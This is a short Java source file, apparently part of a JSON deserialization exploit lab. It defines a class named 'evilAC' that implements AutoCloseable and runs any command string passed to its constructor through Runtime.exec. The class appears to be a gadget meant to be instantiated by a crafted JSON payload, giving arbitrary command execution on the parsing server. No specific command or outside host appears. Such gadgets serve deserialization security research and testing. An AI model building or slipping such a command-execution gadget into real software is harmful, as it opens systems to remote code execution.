package com.json;

import java.io.IOException;

public class evilAC implements AutoCloseable{
    public evilAC(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    @Override
    public void close() throws Exception {}
}
